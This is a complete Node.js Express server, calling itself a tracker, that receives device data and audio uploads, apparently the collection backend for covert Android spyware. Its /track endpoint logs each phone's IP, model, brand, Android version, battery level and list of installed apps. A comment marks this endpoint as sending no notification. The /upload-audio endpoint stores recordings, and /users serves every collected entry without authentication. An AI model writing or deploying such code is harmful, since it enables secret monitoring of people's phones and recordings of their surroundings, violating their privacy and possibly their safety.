const express = require('express');
const fs = require('fs');
const multer = require('multer');

const app = express();
app.use(express.json());

const LOG_FILE = "logs.json";
const MAX_LINES = 1000;

/* ================= MULTER (AUDIO UPLOAD) ================= */

const upload = multer({ dest: 'uploads/' });

/* ================= SAVE LOG ================= */

function saveLog(data) {
  try {
    fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");

    const lines = fs.readFileSync(LOG_FILE, "utf-8")
      .split("\n")
      .filter(l => l.trim() !== '');

    if (lines.length > MAX_LINES) {
      const trimmed = lines.slice(-MAX_LINES).join("\n") + "\n";
      fs.writeFileSync(LOG_FILE, trimmed);
    }

  } catch (e) {
    console.log("File error:", e.message);
  }
}

/* ================= HELPERS ================= */

function getIP(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0]
      || req.socket.remoteAddress
      || "unknown";
}

function safeString(val, max = 100) {
  if (!val) return "unknown";
  return String(val).substring(0, max);
}

function parseApps(input) {
  if (!input) return [];

  try {
    const decoded = decodeURIComponent(input);

    return decoded
      .split(',')
      .map(x => x.trim())
      .filter(x => x.length > 0)
      .slice(0, 100);

  } catch {
    return [];
  }
}

/* ================= TRACK (NO NOTIFICATION NOW) ================= */

app.get('/track', (req, res) => {
  const ip = getIP(req);

  const batteryRaw = req.query.battery;
  const battery = Number.isFinite(Number(batteryRaw))
    ? Number(batteryRaw)
    : null;

  const apps = parseApps(req.query.apps);

  const data = {
    ip,
    userAgent: req.headers['user-agent'] || "unknown",

    model: safeString(req.query.model),
    brand: safeString(req.query.brand),
    android: safeString(req.query.android),

    battery,
    apps,

    time: new Date().toISOString()
  };

  console.log("\n🔥 NEW DEVICE =====================");
  console.log(data);

  saveLog(data);

  res.json({ status: "ok" });
});

/* ================= AUDIO UPLOAD ================= */

app.post('/upload-audio', upload.single('audio'), (req, res) => {
  try {
    const ip = getIP(req);

    const file = req.file;

    if (!file) {
      return res.status(400).send("No file uploaded");
    }

    const data = {
      ip,
      fileName: file.originalname,
      size: file.size,
      path: file.path,
      time: new Date().toISOString()
    };

    console.log("\n🎤 AUDIO RECEIVED =====================");
    console.log(data);

    saveLog(data);

    res.json({ status: "uploaded" });

  } catch (e) {
    console.log("Upload error:", e.message);
    res.status(500).send("error");
  }
});

/* ================= VIEW USERS ================= */

app.get('/users', (req, res) => {
  try {
    if (!fs.existsSync(LOG_FILE)) {
      return res.json([]);
    }

    const data = fs.readFileSync(LOG_FILE, "utf-8");

    const list = data
      .split("\n")
      .filter(l => l.trim() !== '')
      .map(l => {
        try { return JSON.parse(l); }
        catch { return null; }
      })
      .filter(Boolean);

    res.json(list);

  } catch (e) {
    console.log("Read error:", e.message);
    res.json([]);
  }
});

/* ================= CLEAR ================= */

app.get('/clear', (req, res) => {
  try {
    fs.writeFileSync(LOG_FILE, "");
    res.send("Logs cleared");
  } catch (e) {
    res.status(500).send("Error: " + e.message);
  }
});

/* ================= HOME ================= */

app.get('/', (req, res) => {
  res.send("Tracker running (device + audio upload)");
});

/* ================= START ================= */

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});